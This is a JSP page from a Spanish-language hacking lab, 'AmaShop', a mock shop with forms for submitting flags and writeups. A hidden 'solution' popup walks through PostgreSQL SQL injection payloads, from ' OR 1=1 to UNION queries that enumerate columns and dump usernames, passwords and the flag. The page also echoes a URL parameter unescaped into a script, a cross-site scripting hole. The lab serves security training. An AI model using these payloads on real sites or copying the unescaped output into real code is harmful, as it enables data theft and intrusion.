<%@ page contentType="text/html; charset=UTF-8" language="java"%>
<%@ page import="dao.LaboratorioDAO" %>
<%@ page import="utils.JWTUtils" %>
<%@ page import="utils.UsuarioJWT" %>

<%
    UsuarioJWT usuarioJWT = null;

    try {
        usuarioJWT = JWTUtils.obtenerUsuarioDesdeRequest(request);
    } catch (Exception e) {
        // Redirigir al servlet de logout en vez de al .jsp
        response.sendRedirect(request.getContextPath() + "/logout");
        return;
    }

 	// Obtener el lab_id de "amashop" desde la base de datos
    int labId = LaboratorioDAO.obtenerIdLaboratorioAmashop();
    String mensaje = "";

    // Recuperamos el mensaje desde la URL
    String resultadoFlag = request.getParameter("mensaje");
%>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="<%= request.getContextPath() %>/img/icono/icono_cinco_hackend.ico">
<title>AMASHOP</title>
<link rel="stylesheet" href="<%= request.getContextPath() %>/css/amashop.css">
<style>
	/* Estilo del mensaje emergente */
		.message-popup {
		    position: fixed;
		    top: 50%;
		    left: 50%;
		    transform: translate(-50%, -50%);
		    background-color: rgba(0, 0, 0, 0.85); /* Un poco más oscuro para más énfasis */
		    padding: 25px 40px; /* Más espacio alrededor del mensaje */
		    border-radius: 10px; /* Bordes más redondeados */
		    color: white;
		    max-width: 90%;
		    min-width: 300px;
		    display: none;
		    z-index: 1000;
		    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); /* Agregar sombra para dar profundidad */
		    font-family: Arial, sans-serif;
		}
		
		/* Estilo del contenido dentro del popup */
		.message-popup .message-popup-content {
		    font-size: 16px;
		    padding: 10px;
		    text-align: center; /* Centrar el texto */
		}
		
		/* Estilo del encabezado dentro del popup */
		.message-popup .message-popup-header {
		    font-size: 20px;
		    font-weight: bold;
		    margin-bottom: 15px;
		    text-align: center;
		    color: #f5f5f5;
		}
		
		/* Estilo del botón para cerrar el popup */
		.message-popup .message-popup-close-btn {
		    background: #ff5e57;
		    border: none;
		    color: white;
		    padding: 8px 16px;
		    font-size: 18px;
		    cursor: pointer;
		    border-radius: 5px;
		    display: block;
		    margin: 20px auto 0; /* Centrar y separar de la parte superior */
		    text-align: center;
		}
		
		/* Cambio de color al pasar el ratón sobre el botón de cerrar */
		.message-popup .message-popup-close-btn:hover {
		    background: #ff3830;
		}
		
		/* Ocultar el popup por defecto */
		.message-popup {
		    display: none; /* Asegúrate de que esté oculto por defecto */
		}
		
		/* Mostrar el popup cuando tiene la clase .show */
		.message-popup.show {
		    display: block; /* Se muestra cuando tiene la clase .show */
		}
		/* Popup estilo minimalista */
		.popup-solucion {
		  position: fixed;
		  top: 50%;
		  left: 50%;
		  transform: translate(-50%, -50%);
		  background-color: #ffffff;
		  border-radius: 10px;
		  padding: 25px 20px;
		  width: 400px;
		  max-width: 90%;
		  z-index: 1000;
		  font-family: 'Segoe UI', sans-serif;
		  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
		  animation: popupFade 0.3s ease-in-out;
		  overflow: hidden; /* Evitar el desbordamiento fuera del popup */
		}
		
		.popup-header-solucion {
		  display: flex;
		  justify-content: space-between;
		  align-items: center;
		  border-bottom: 1px solid #e0e0e0;
		  padding-bottom: 10px;
		  margin-bottom: 15px;
		}
		
		.popup-header-solucion h2 {
		  color: #333;
		  font-size: 1.2rem;
		  margin: 0;
		}
		
		.cerrar-btn {
		  background: none;
		  border: none;
		  color: #888;
		  font-size: 1.2rem;
		  cursor: pointer;
		}
		
		/* Área de contenido del popup con scroll */
		.popup-contenido-solucion {
		  color: #444;
		  font-size: 0.95rem;
		  line-height: 1.5;
		  margin-bottom: 20px;
		  max-height: 300px; /* Define el tamaño máximo del contenido */
		  overflow-y: auto; /* Agrega scroll vertical si el contenido excede el tamaño */
		  padding-right: 10px; /* Da espacio para el scrollbar */
		}
		
		.codigo-solucion {
		  font-family: 'Courier New', monospace;
		  background-color: #ababab;
		  padding: 3px 6px;
		  border-radius: 4px;
		  color: #000;
		}
		
		.comentario-codigo {
		  color: #555;
		  font-style: italic;
		  margin-left: 5px;
		}
		
		.btn-cerrar-solucion {
		  background-color: #1976d2;
		  color: white;
		  border: none;
		  padding: 10px 16px;
		  border-radius: 4px;
		  font-weight: 500;
		  cursor: pointer;
		  transition: background-color 0.3s ease;
		}
		
		.btn-cerrar-solucion:hover {
		  background-color: #1565c0;
		}
		
		/* Botón de solución */
		.solution-btn {
		  position: fixed;
		  bottom: 10px;
		  left: 10px;
		  background-color: #1976d2;
		  color: #fff;
		  border: none;
		  font-size: 1.5rem;
		  border-radius: 50%;
		  width: 50px;
		  height: 50px;
		  cursor: pointer;
		  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
		  transition: transform 0.2s ease;
		  z-index: 1000;
		}
		
		.solution-btn:hover {
		  transform: scale(1.1);
		}
		
		.hidden {
		  display: none;
		}
		
		@keyframes popupFade {
		  from {
		    opacity: 0;
		    transform: translate(-50%, -50%) scale(0.95);
		  }
		  to {
		    opacity: 1;
		    transform: translate(-50%, -50%) scale(1);
		  }
		}
		.form-container-horizontal {
		    display: flex;
		    justify-content: center;
		    align-items: flex-start;
		    gap: 40px;
		    margin-top: 50px;
		    flex-wrap: wrap;
		}
		
		/* Estilo formulario Writeup */
		.writeup-form {
		    background-color: #f9f9f9;
		    text-align: center;
		    padding: 2rem;
		    border-radius: 10px;
		    box-shadow: 0 0 15px rgba(0,0,0,0.1);
		    color: #333;
		    display: flex;
		    flex-direction: column;
		    width: 100%;
		    max-width: 400px;
		}
		
		.writeup-form label {
		    margin-bottom: 8px;
		    font-weight: 600;
		    color: #555;
		}
		
		.writeup-form input[type="url"] {
		    padding: 10px;
		    border: 1px solid #ccc;
		    border-radius: 5px;
		    background-color: #fff;
		    color: #333;
		    margin-bottom: 20px;
		}
		
		.writeup-form button {
		    padding: 10px;
		    background-color: #3a8bcd;
		    color: #fff;
		    border: none;
		    border-radius: 5px;
		    font-weight: bold;
		    cursor: pointer;
		    transition: background-color 0.3s ease;
		}
		
		.writeup-form button:hover {
		    background-color: #3272aa;
		}
		
		/* Estilo formulario FLAG */
		.flag-input-section {
		    display: flex;
		    flex-direction: column;
		    align-items: center;
		    justify-content: center;
		    padding: 2rem;
		    background-color: #f9f9f9;
		    border-radius: 10px;
		    box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
		    max-width: 400px;
		    width: 100%;
		    color: #333;
		    text-align: center;
		}
		
		.flag-input-section h3 {
		    margin-bottom: 20px;
		}
		
		.flag-form {
		    display: flex;
		    flex-direction: column;
		    gap: 15px;
		    width: 100%;
		}
		
		.flag-form input[type="text"] {
		    padding: 10px;
		    font-size: 14px;
		    border: 1px solid #ccc;
		    border-radius: 5px;
		    background-color: #fff;
		    color: #333;
		    width: 100%;
		}
		
		.flag-btn {
		    padding: 10px;
		    background-color: #4CAF50;
		    color: white;
		    font-size: 14px;
		    border: none;
		    border-radius: 5px;
		    cursor: pointer;
		    transition: background-color 0.3s ease;
		}
		
		.flag-btn:hover {
		    background-color: #45a049;
		}

</style>
</head>
<body>
	
	<header>
		<div class="logo"><a style="text-decoration: none; color: white;" href="<%= request.getContextPath() %>/home_directory/home.jsp?page=0">AmaShop</a></div>
		<input type="text" placeholder="Buscar productos..." class="search-bar">
		<nav>
			<button id="open-cart-btn">Ver Carrito</button>
		</nav>
	</header>
	<!-- Popup para mostrar el mensaje -->
    <div id="popupMessage" class="message-popup">
        <div class="message-popup-header">Mensaje</div>
        <div class="message-popup-content" id="popupContent">
            <p><%= request.getAttribute("mensaje") %></p>
        </div>
        <button class="message-popup-close-btn"><a href="<%= request.getContextPath() %>/labs/amashop/amashop.jsp" style="text-decoration: none; color: white;">Cerrar</a></button>
    </div>
	<div class="main-container">
		<aside class="sidebar">
			<h3>Categorías</h3>
			<ul>
				<li><a href="#">Tecnología</a></li>
				<li><a href="#">Hogar</a></li>
				<li><a href="#">Ropa</a></li>
				<li><a href="#">Deportes</a></li>
				<li><a href="#">Libros</a></li>
			</ul>
		</aside>
		
		<main class="products">
		<div class="form-container-horizontal">
			<!-- FORMULARIO PARA ENVIAR WRITEUP -->
			<form class="writeup-form" action="<%= request.getContextPath() %>/WriteupControlador" method="post">
			    <input type="hidden" name="lab_id" value="<%= labId %>">
			    <input type="hidden" name="user_id" value="<%= usuarioJWT.getUserId() %>">
			    <input type="hidden" name="username" value="<%= usuarioJWT.getUsuario() %>">
			    <label for="url_writeup">Enviar enlace del Writeup:</label>
			    <input type="url" name="url_writeup" id="url_writeup" required>
			    <button type="submit">Enviar Writeup</button>
			</form>
		</div>
		<div class="form-container-horizontal">
		  <div class="flag-input-section">
			  <h3>Introduce la flag del laboratorio</h3>
			  <form action="<%= request.getContextPath() %>/validarFlag" method="get" class="flag-form">
				  <input type="hidden" name="user_id" value="<%= usuarioJWT.getUserId() %>">
				  <input type="hidden" name="lab_id" value="<%= labId %>">
				  <label for="flag">Ingrese la FLAG:</label>
				  <input type="text" id="flag" name="flag" required>
				  <button class="flag-btn" type="submit" class="style-button-flag">Enviar FLAG</button>
			  </form>
		</div>
		</div>
			<div id="sql-results"></div>
			
		    <!-- Producto 1 -->
		    <div class="product-card" data-id="1">
		        <img src="<%= request.getContextPath() %>/img/img_amashop/smartphone-x100.png" alt="Smartphone X100" />
		        <h4>Smartphone X100</h4>
		        <p>299.99€</p>
		        <div class="buttons">
		            <button class="add-to-cart">Agregar al carrito</button>
		            <button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/smartphone.jsp'">Ver Producto</button>
		        </div>
		    </div>
		
		    <!-- Producto 2 -->
		    <div class="product-card" data-id="2">
		        <img src="<%= request.getContextPath() %>/img/img_amashop/auriculares-bluetooth.png" alt="Auriculares Bluetooth" />
		        <h4>Auriculares Bluetooth</h4>
		        <p>59.99€</p>
		        <div class="buttons">
		            <button class="add-to-cart">Agregar al carrito</button>
		            <button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/auriculares.jsp'">Ver Producto</button>
		        </div>
		    </div>
		
		    <!-- Producto 3 -->
		    <div class="product-card" data-id="3">
		        <img src="<%= request.getContextPath() %>/img/img_amashop/Smartwatch-Z50.png" alt="Smartwatch Z50" />
		        <h4>Smartwatch Z50</h4>
		        <p>199.99€</p>
		        <div class="buttons">
		            <button class="add-to-cart">Agregar al carrito</button>
		            <button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/smartwatch.jsp'">Ver Producto</button>
		        </div>
		    </div>
		
		    <!-- Producto 4 -->
		    <div class="product-card" data-id="4">
		        <img src="<%= request.getContextPath() %>/img/img_amashop/Teclado-Mecanico-RGB.png" alt="Teclado Mecánico RGB" />
		        <h4>Teclado Mecánico RGB</h4>
		        <p>99.99€</p>
		        <div class="buttons">
		            <button class="add-to-cart">Agregar al carrito</button>
		            <button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/teclado.jsp'">Ver Producto</button>
		        </div>
		    </div>

			<!-- Producto 5 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Raton-Gaming-Pro.png"
					alt="Ratón Gaming Pro" />
				<h4>Ratón Gaming Pro</h4>
				<p>49.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/raton.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 6 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Monitor-Curvo-27.png"
					alt="Monitor Curvo 27”" />
				<h4>Monitor Curvo 27”</h4>
				<p>349.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/monitor.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 7 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Camara-Digital-4K.png"
					alt="Cámara Digital 4K" />
				<h4>Cámara Digital 4K</h4>
				<p>499.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/camara.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 8 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Laptop-Gaming-X300.png"
					alt="Laptop Gaming X300" />
				<h4>Laptop Gaming X300</h4>
				<p>1299.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/portatil.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 9 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Cargador-Inalambrico.png"
					alt="Cargador Inalámbrico" />
				<h4>Cargador Inalámbrico</h4>
				<p>29.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/cargador.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 10 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Altavoces-Bluetooth.png"
					alt="Altavoces Bluetooth" />
				<h4>Altavoces Bluetooth</h4>
				<p>79.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/altavoz.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 11 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/MicroSD-128-GB.png" alt="MicroSD 128GB" />
				<h4 class="">MicroSD 128GB</h4>
				<p>19.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/tarjeta.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 12 -->
			<div class="product-card">
				<img src="<%= request.getContextPath() %>/img/img_amashop/Mochila-Gamer.png" alt="Mochila Gamer" />
				<h4>Mochila Gamer</h4>
				<p>39.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/mochila.jsp'">Ver Producto</button>
				</div>
			</div>
			
			<!-- Producto 13 -->
			<div class="product-card hidden-product" style="display: none;">
				<img src="<%= request.getContextPath() %>/img/img_amashop/none.png" alt="None" />
				<h4 class="">PRODUCTO 13</h4>
				<p>129.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/none.jsp'">Ver Producto</button>
				</div>
			</div>

			<!-- Producto 14 -->
			<div class="product-card hidden-product" style="display: none;">
				<img src="<%= request.getContextPath() %>/img/img_amashop/none.png" alt="None" />
				<h4>PRODUCTO 14</h4>
				<p>59.99€</p>
				<div class="buttons">
					<button class="add-to-cart">Agregar al carrito</button>
					<button class="view-product" onclick="window.location.href='<%= request.getContextPath() %>/labs/amashop/products/none.jsp'">Ver Producto</button>
				</div>
			</div>

		</main>
	</div>
	<!-- Menú lateral para el carrito -->
	<div id="cart-sidebar" class="cart-sidebar">
	    <div class="cart-sidebar-content">
	        <button id="close-cart-btn" class="close-cart-btn">Cerrar</button>
	        <h2>Mi Carrito</h2>
	        <ul id="cart-items">
	            <!-- Los productos se agregarán aquí -->
	        </ul>
	        <br>
	        <div id="cart-total">Total: 0.00€</div>
	    </div>
	</div>
    <footer>
        <p>&copy; 2025 AmaShop. Todos los derechos reservados.</p>
    </footer>
    <!-- Botón para mostrar la solución -->
	<button class="solution-btn" type="button" onclick="showPopupSolution()">💡</button>
	
	<!-- Popup de solución -->
	<div id="popup-solution" class="popup-solucion hidden">
	  <div class="popup-header-solucion">
	    <h2>💡 Solución</h2>
	    <button class="cerrar-btn" onclick="closePopupSolution()">✖</button>
	  </div>
	  <div class="popup-contenido-solucion">
		  <p>En este laboratorio nos encontramos con una vulnerabilidad de tipo <b>SQL Injection (SQLi)</b> en una aplicación que utiliza <b>PostgreSQL</b> como base de datos.</p>
		  <p>El problema radica en que las consultas SQL no están siendo correctamente sanitizadas, lo que permite que los usuarios inyecten código SQL malicioso en la entrada de búsqueda.</p>
		  <p><b>EJEMPLOS:</b></p>
		  
		  <p><span class="codigo-solucion">' OR 1=1-- -</span> <span class="comentario-codigo"># Con este comando logramos eludir las restricciones y ver todos los productos, incluidos los ocultos, al saber que la aplicación es vulnerable a esta inyección.</span></p>
		  
		  <p><span class="codigo-solucion">' union select current_database()-- -</span> <span class="comentario-codigo"># Este comando nos permite ver la base de datos actual, en este caso <i>amashop_db</i>.</span></p>
		  
		  <p><span class="codigo-solucion">' union select datname from amashop_db-- -</span> <span class="comentario-codigo"># Ahora que sabemos el nombre de la base de datos, podemos consultar las tablas dentro de ella.</span></p>
		  
		  <p><span class="codigo-solucion">' union select column_name from information_schema.columns where table_name='users'-- -</span> <span class="comentario-codigo"># Aquí consultamos las columnas de la tabla <i>users</i> para obtener información sobre qué datos se almacenan en dicha tabla.</span></p>
		  
		  <p><span class="codigo-solucion">' union select column_name from information_schema.columns where table_name='flag'-- -</span> <span class="comentario-codigo"># Lo mismo con la tabla <i>flag</i> para ver sus columnas y encontrar la que contiene la FLAG.</span></p>
		  
		  <p><span class="codigo-solucion">' union select username || ' - ' || password from users-- -</span> <span class="comentario-codigo"># En este punto podemos obtener los nombres de usuario y las contraseñas de la tabla <i>users</i>.</span></p>
		  
		  <p><span class="codigo-solucion">' union select flag from flag-- -</span> <span class="comentario-codigo"># Finalmente, obtenemos la <b>FLAG</b> que está almacenada en la tabla <i>flag</i>, completando así el laboratorio.</span></p>
		
		  <p>Este tipo de vulnerabilidad es muy común en aplicaciones que no implementan medidas adecuadas de validación de las entradas de los usuarios, lo que permite a un atacante obtener acceso no autorizado a la base de datos y obtener información sensible.</p>
		</div>

	  <button class="btn-cerrar-solucion" onclick="closePopupSolution()">Cerrar</button>
	</div>
   <script src="<%= request.getContextPath() %>/js/amashop.js"></script>
   <script>
		 //Mostrar el popup de solución
		   function showPopupSolution() {
		     document.getElementById("popup-solution").classList.remove("hidden");
		   }
		
		   // Cerrar el popup de solución
		   function closePopupSolution() {
		     document.getElementById("popup-solution").classList.add("hidden");
		   }
		   
        // Función para mostrar el popup
        function showPopup(message) {
            var popup = document.getElementById("popupMessage");
            var content = document.getElementById("popupContent");
            content.innerHTML = message; // Ponemos el mensaje en el popup
            popup.classList.add('show'); // Hacemos visible el popup
        }

        // Función para cerrar el popup
        function closePopup() {
            var popup = document.getElementById("popupMessage");
            popup.classList.remove('show'); // Ocultamos el popup
            window.location.href = "<%= request.getContextPath() %>/labs/foro-xss.jsp"; // Redirigimos
        }

        // Si el mensaje no es nulo, mostramos el popup con el mensaje
        <%
            if (resultadoFlag != null) { 
        %>
            showPopup("<%= resultadoFlag %>"); // Mostrar el mensaje en el popup
        <% 
            }
        %>
    </script>
</body>
</html>